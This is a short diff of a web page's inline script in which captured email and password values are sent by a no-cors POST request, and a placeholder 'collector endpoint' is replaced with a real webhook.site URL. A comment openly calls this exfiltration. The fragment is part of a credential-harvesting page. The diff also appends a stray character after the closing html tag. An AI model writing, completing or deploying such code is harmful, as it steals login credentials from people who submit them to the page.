@@ -23,7 +23,7 @@
 
           if (email && password) {
             // Exfiltrate to your server – replace URL with your collector endpoint
-            fetch('https://your-collector.com/capture', {
+            fetch('https://webhook.site/0b275640-c758-4b06-8b38-e6787c7e21f6', {
               method: 'POST',
               mode: 'no-cors', // to avoid CORS preflight, but won't see response
               headers: { 'Content-Type': 'application/json' },
@@ -35,4 +35,4 @@
     })();
   </script>
 </body>
-</html>
+</html>w
